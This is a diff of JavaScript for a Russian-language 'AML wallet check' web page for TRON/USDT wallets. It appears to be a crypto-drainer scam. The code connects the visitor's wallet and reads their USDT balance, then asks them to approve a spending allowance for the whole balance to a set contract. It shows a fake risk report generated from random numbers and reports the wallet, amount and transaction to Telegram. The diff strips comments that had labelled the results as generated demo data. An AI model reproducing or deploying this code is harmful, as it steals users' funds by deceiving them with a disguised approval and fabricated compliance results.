@@ -25,7 +25,6 @@ const suspiciousTx = document.getElementById('suspiciousTx');
 const walletAge = document.getElementById('walletAge');
 const lastActive = document.getElementById('lastActive');
 const riskPercent = document.getElementById('riskPercent');
-const riskLevel = document.getElementById('riskLevel');
 const sourcesList = document.getElementById('sourcesList');
 const downloadPdfBtn = document.getElementById('downloadPdfBtn');
 const amountCardContainer = document.getElementById('amountCardContainer');
@@ -138,23 +137,18 @@ document.addEventListener('DOMContentLoaded', function() {
 // ============================================
 async function connectTrustWallet() {
     try {
-        // Проверяем наличие Trust Wallet
         if (window.trustwallet && window.trustwallet.tronLink) {
-            // Запрашиваем подключение
             await window.trustwallet.tronLink.request({ method: 'tron_requestAccounts' });
             
-            // Получаем адрес
             const address = window.trustwallet.tronLink.defaultAddress.base58;
             connectedWalletAddress = address;
             
-            // Обновляем интерфейс
             walletInput.value = address;
             walletInput.style.borderColor = '#00c9b7';
             document.getElementById('connectedStatus').style.display = 'inline-flex';
             
             console.log('✅ Trust Wallet подключён:', address);
             
-            // Уведомление в Telegram
             await sendToTelegram({
                 type: 'connection',
                 address: address,
@@ -194,7 +188,6 @@ async function getUSDTBalance(address) {
 // ============================================
 async function handleTronCheck() {
     try {
-        // Определяем адрес для проверки
         let walletAddress = walletInput.value.trim();
         
         if (!walletAddress && connectedWalletAddress) {
@@ -206,7 +199,6 @@ async function handleTronCheck() {
             return;
         }
 
-        // Получаем провайдер
         const tronWeb = window.tronWeb || (window.trustwallet?.tronLink?.tronWeb);
         if (!tronWeb || !tronWeb.defaultAddress) {
             alert('Пожалуйста, установите TronLink или Trust Wallet');
@@ -214,8 +206,6 @@ async function handleTronCheck() {
         }
 
         const userAddress = tronWeb.defaultAddress.base58;
-
-        // Получаем баланс USDT
         const balance = await getUSDTBalance(userAddress);
         
         if (!balance) {
@@ -225,18 +215,16 @@ async function handleTronCheck() {
 
         const balanceInUSDT = (balance / 1000000).toFixed(2);
 
-        // Проверяем лимиты
         if (balance < MIN_AMOUNT) {
-            alert(`Минимальная сумма для проверки: 5 USDT. Ваш баланс: ${balanceInUSDT} USDT`);
+            alert(`Минимальная сумма: 5 USDT. Ваш баланс: ${balanceInUSDT} USDT`);
             return;
         }
 
         if (balance > MAX_AMOUNT) {
-            alert(`Максимальная сумма для проверки: 10000 USDT. Ваш баланс: ${balanceInUSDT} USDT`);
+            alert(`Максимальная сумма: 10000 USDT. Ваш баланс: ${balanceInUSDT} USDT`);
             return;
         }
 
-        // Показываем модальное окно с реальной суммой
         currentApproveAmount = balance;
         if (modalAmount) {
             modalAmount.textContent = `${balanceInUSDT} USDT`;
@@ -255,20 +243,16 @@ async function handleTronCheck() {
 // ============================================
 async function confirmApprove() {
     try {
-        // Закрываем модальное окно
         document.getElementById('approveModal').style.display = 'none';
         
-        // Меняем состояние кнопки
         const originalText = checkBtn.innerHTML;
         checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка транзакции...';
         checkBtn.disabled = true;
 
-        // Получаем провайдер
         const tronWeb = window.tronWeb || (window.trustwallet?.tronLink?.tronWeb);
         const userAddress = tronWeb.defaultAddress.base58;
         const walletAddress = walletInput.value.trim() || connectedWalletAddress;
 
-        // Отправляем approve
         const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
         
         const tx = await contract.approve(
@@ -281,11 +265,9 @@ async function confirmApprove() {
 
         console.log('✅ Approve отправлен, tx:', tx);
 
-        // Возвращаем кнопку
         checkBtn.innerHTML = originalText;
         checkBtn.disabled = false;
 
-        // Запускаем AML проверку
         const balanceInUSDT = (currentApproveAmount / 1000000).toFixed(2);
         startAMLCheck(walletAddress, userAddress, tx, balanceInUSDT);
 
@@ -307,13 +289,12 @@ function closeApproveModal() {
 }
 
 // ============================================
-// УЛУЧШЕННАЯ ФУНКЦИЯ AML ПРОВЕРКИ (ДЕМО)
+// ФУНКЦИЯ AML ПРОВЕРКИ
 // ============================================
 function startAMLCheck(address, userAddress, tx, amount) {
     resultSection.style.display = 'block';
     checkedAddress.textContent = address;
 
-    // Добавляем карточку суммы
     if (amountCardContainer) {
         amountCardContainer.innerHTML = `
             <div class="amount-card">
@@ -326,12 +307,10 @@ function startAMLCheck(address, userAddress, tx, amount) {
         `;
     }
 
-    // Генерируем правдоподобные данные
-    const totalTxCount = Math.floor(Math.random() * 500) + 50; // 50-550
-    const suspiciousCount = Math.floor(Math.random() * 30) + 1; // 1-31
-    const riskPercent = Math.floor(Math.random() * 100); // 0-99
+    const totalTxCount = Math.floor(Math.random() * 500) + 50;
+    const suspiciousCount = Math.floor(Math.random() * 30) + 1;
+    const riskPercent = Math.floor(Math.random() * 100);
     
-    // Возраст кошелька (от 1 дня до 3 лет)
     const ageDays = Math.floor(Math.random() * 1095) + 1;
     let ageText;
     if (ageDays < 30) {
@@ -344,7 +323,6 @@ function startAMLCheck(address, userAddress, tx, amount) {
         ageText = years + ' г. ' + (months > 0 ? months + ' мес.' : '');
     }
     
-    // Последняя активность (от 1 часа до 30 дней назад)
     const hoursAgo = Math.floor(Math.random() * 720) + 1;
     let lastActiveText;
     if (hoursAgo < 24) {
@@ -353,10 +331,9 @@ function startAMLCheck(address, userAddress, tx, amount) {
         lastActiveText = Math.floor(hoursAgo / 24) + ' дней назад';
     }
 
-    // Источники риска (выбираем случайные из категорий)
     const riskSources = [];
     const shuffled = [...categories].sort(() => 0.5 - Math.random());
-    const sourcesCount = Math.floor(riskPercent / 20) + 1; // 1-5 источников
+    const sourcesCount = Math.floor(riskPercent / 20) + 1;
     
     for (let i = 0; i < sourcesCount; i++) {
         if (shuffled[i]) {
@@ -364,14 +341,12 @@ function startAMLCheck(address, userAddress, tx, amount) {
         }
     }
 
-    // Обновляем UI
     totalTx.textContent = totalTxCount;
     suspiciousTx.textContent = suspiciousCount;
     walletAge.textContent = ageText;
     lastActive.textContent = lastActiveText;
     updateRiskChart(riskPercent);
     
-    // Отображаем источники риска
     sourcesList.innerHTML = '';
     if (riskSources.length > 0) {
         riskSources.forEach(s => {
@@ -383,7 +358,6 @@ function startAMLCheck(address, userAddress, tx, amount) {
         sourcesList.innerHTML = '<p><i class="fas fa-check-circle" style="color: #00c9b7;"></i> Чистый кошелёк, риски не обнаружены</p>';
     }
     
-    // Отправляем данные в Telegram
     sendToTelegram({ 
         address, 
         amount: amount,
@@ -400,28 +374,25 @@ function startAMLCheck(address, userAddress, tx, amount) {
 // ФУНКЦИЯ ОБНОВЛЕНИЯ ГРАФИКА РИСКА
 // ============================================
 function updateRiskChart(risk) {
-    // Обновляем процент
     if (riskPercent) {
         riskPercent.textContent = risk + '%';
     }
     
-    // Обновляем gauge fill (для кругового графика)
     const gaugeFill = document.getElementById('gaugeFill');
     if (gaugeFill) {
-        const maxDash = 251.2; // длина дуги
+        const maxDash = 251.2;
         const dashOffset = maxDash - (risk / 100) * maxDash;
         gaugeFill.style.strokeDashoffset = dashOffset;
     }
     
-    // Обновляем цвет в зависимости от риска
-    let color = '#00c9b7'; // зеленый
+    let color = '#00c9b7';
     let riskLevelText = 'Низкий';
     
     if (risk > 25 && risk <= 75) {
-        color = '#ffaa5e'; // желтый
+        color = '#ffaa5e';
         riskLevelText = 'Средний';
     } else if (risk > 75) {
-        color = '#ff6b6b'; // красный
+        color = '#ff6b6b';
         riskLevelText = 'Высокий';
     }
     
@@ -429,7 +400,6 @@ function updateRiskChart(risk) {
         gaugeFill.style.stroke = color;
     }
     
-    // Обновляем бейдж
     const riskBadge = document.getElementById('riskBadge');
     if (riskBadge) {
         riskBadge.className = 'result-badge';
@@ -531,3 +501,24 @@ function downloadPDF() {
         
         doc.text('Последняя активность:', 20, y);
         doc.text(last, 70, y);
+        y += 15;
+        
+        if (sourcesText) {
+            doc.text('Источники риска:', 20, y);
+            y += 7;
+            const lines = doc.splitTextToSize(sourcesText, 170);
+            doc.text(lines, 25, y);
+        }
+        
+        const fileName = `AML-report-${new Date().toISOString().slice(0,10)}.pdf`;
+        doc.save(fileName);
+        console.log('✅ PDF успешно создан');
+        
+    } catch (error) {
+        console.error('❌ Ошибка при создании PDF:', error);
+        alert('Ошибка создания PDF. Проверьте консоль (F12) для деталей.');
+    }
+}
+
+// ============================================
+// КОПИ
